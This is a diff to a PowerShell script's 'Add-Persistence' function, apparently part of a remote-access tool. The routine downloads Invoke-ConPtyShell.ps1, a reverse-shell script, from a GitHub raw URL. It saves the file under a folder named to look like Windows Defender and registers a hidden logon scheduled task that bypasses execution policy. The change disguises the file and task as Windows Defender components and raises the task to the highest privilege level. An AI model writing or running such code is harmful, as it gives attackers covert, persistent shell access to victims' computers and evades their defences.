@@ -16,15 +16,15 @@ function Connect-ZiPo {
 
     function Add-Persistence {
     try {
-        $targetPath = "$env:TEMP\MicrosoftUpdate.ps1"
+        $targetPath = "$env:APPDATA\Microsoft\Windows Defender\updater.ps1"
         $url = "https://raw.githubusercontent.com/zipo0/studytime-/main/Invoke-ConPtyShell.ps1"
 
         # Скачиваем и сохраняем копию скрипта
         Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $targetPath
 
         # Создание задачи
-        $taskName = "MicrosoftEdgeUpdateChecker1"
-        schtasks /Create /SC ONLOGON /TN $taskName /TR "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`"" /F | Out-Null
+        $taskName = "WindowsDefenderUpdateChecker1"
+        schtasks /Create /SC ONLOGON /TN $taskName /TR "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$targetPath`"" /RL HIGHEST /F | Out-Null
 
         return "[+] Persistence installed to $targetPath"
     }
